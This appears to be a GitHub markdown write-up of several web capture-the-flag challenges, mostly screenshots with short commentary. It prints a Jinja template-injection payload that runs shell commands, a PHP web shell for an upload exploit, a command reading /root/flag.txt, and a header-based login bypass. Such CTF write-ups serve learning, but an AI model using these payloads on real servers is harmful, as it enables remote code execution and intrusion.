WEB!
<details><summary></summary></details>

<details><summary>Unminify</summary>

<img width="1148" height="500" alt="image" src="https://github.com/user-attachments/assets/47cbbf58-f1b9-4527-af88-a41d58298db0" />
<img width="1123" height="94" alt="image" src="https://github.com/user-attachments/assets/45a3f8e2-cd7f-410c-a056-c8f32aa53232" />
Literally no explanation needed. 

<img width="1148" height="500" alt="image" src="https://github.com/user-attachments/assets/a39b8169-b5a8-442f-8b1a-e7c899a4e168" />
</details>



<details><summary>WebDecode</summary>


<img width="773" height="253" alt="image" src="https://github.com/user-attachments/assets/267ca65b-8983-43d4-8af9-652498ff71fb" />
<img width="1148" height="500" alt="image" src="https://github.com/user-attachments/assets/1d297096-668a-4eea-9bff-7a29ea6f24ec" />

<img width="964" height="564" alt="image" src="https://github.com/user-attachments/assets/22b32685-4b1c-47a9-a765-6cb2ddce2627" />

</details>



<details>  
<summary>SSTI1</summary>

> Server side template injection
> Mainly used on python web servers which render template
> injects malicious code into the template 


![image](https://github.com/user-attachments/assets/60163473-6ed8-4442-8022-7c3a68a6dbc1)
![image](https://github.com/user-attachments/assets/30d058a5-cf52-4a91-a8e1-ba13e75ab2ee)


Announcement website, COOL

ITS TIME TO ANNOUNCE THAT IM GA...


So now we announce that 60 + 9 is 

69 

NICE

This confirms the vulnerability, Server side template injection. Which also is literlly the hint.

![image](https://github.com/user-attachments/assets/9e8b5a4c-03e4-43ac-a707-9b05dcc69611)
![image](https://github.com/user-attachments/assets/6baa1558-8716-4d86-be16-18469ac0b609)

Heres some code thats not mine, but i know it allows to run any shell commands 

```{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}```
![image](https://github.com/user-attachments/assets/1832d8e9-5f34-403c-a26c-94be10fa72c3)

and now we just cat that file and done ! 

![image](https://github.com/user-attachments/assets/17f52e53-6760-4834-818e-6e3d82d8d416)

</details>



<details>
<summary>n0s4n1ty 1</summary>

> File upload exploit
> not sanitizing user input causing RCE

![image](https://github.com/user-attachments/assets/1f9d22df-172d-4644-959f-80f14288176d)
 
nice pic bro 

![image](https://github.com/user-attachments/assets/b08a92ef-7f24-4754-b68c-369cc7af8d38)
![image](https://github.com/user-attachments/assets/ee05a9d6-74ec-4687-afeb-b935cf883dfe)

Uploaded and to no surprise, we can see the image in there =)

![image](https://github.com/user-attachments/assets/ab94b8a6-c2a3-43f2-bb8d-36ccf3499a5e)
![image](https://github.com/user-attachments/assets/c66b006a-c662-423d-831d-27ef3baa94bf)

Uploaded, acessible and rendered. 

TIME TO USE CHINA'S LATEST TECHNOLOGY: DEEPSEEK

With a simple webshell it generated, we can start executing commands on their server and navigate the files

```
<?php
if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>

<form method="GET">
<input type="text" name="cmd" placeholder="Enter command">
<input type="submit" value="Execute">
</form>
```

![image](https://github.com/user-attachments/assets/dcc13ce5-d8c3-42e6-abce-0324f1d4021d)

```cd ../../../../; sudo cat /root/flag.txt```

By executing this command, we are able to read the flag file in the /root directory, of course, with sudo 

![image](https://github.com/user-attachments/assets/34e69ca6-3686-4c9d-b7bc-0f3802d7a0fe)

![image](https://github.com/user-attachments/assets/a1c909ff-b789-4949-a444-fcc9c0404b8d)


</details>

<details>
<summary>Crack the Gate 1</summary>

<img width="946" height="638" alt="image" src="https://github.com/user-attachments/assets/429cbd3b-ce98-4ff5-983b-c19771bf99c5" />
<img width="946" height="638" alt="image" src="https://github.com/user-attachments/assets/311a1946-1546-4f9d-b644-26b881ef229e" />

so got login page , but no acccess. 

```
 <!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
<!-- Remove before pushing to production! -->
```

Some comments found in the html
 after decoding , you get ```NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes```

<img width="1226" height="477" alt="image" src="https://github.com/user-attachments/assets/584575b0-22ee-4420-8537-eebc741c9262" />

 So just add the header and done 

</details>

<details>
<summary> 
Cookie Monster Secret Recipe
</summary>

found the cookie, now what? 
<img width="1918" height="878" alt="image" src="https://github.com/user-attachments/assets/685f8a0c-603a-4023-8b5b-e2dc8ee40b5a" />

took some thought, but the %3D in the end kinda gave it away as url encoded
<img width="1238" height="505" alt="image" src="https://github.com/user-attachments/assets/851c413c-52d5-4c82-9b92-45b7e57f58b2" />

  <img width="1226" height="477" alt="image" src="https://github.com/user-attachments/assets/6db70677-71b0-4219-98c1-2acfe156b940" />
</details>
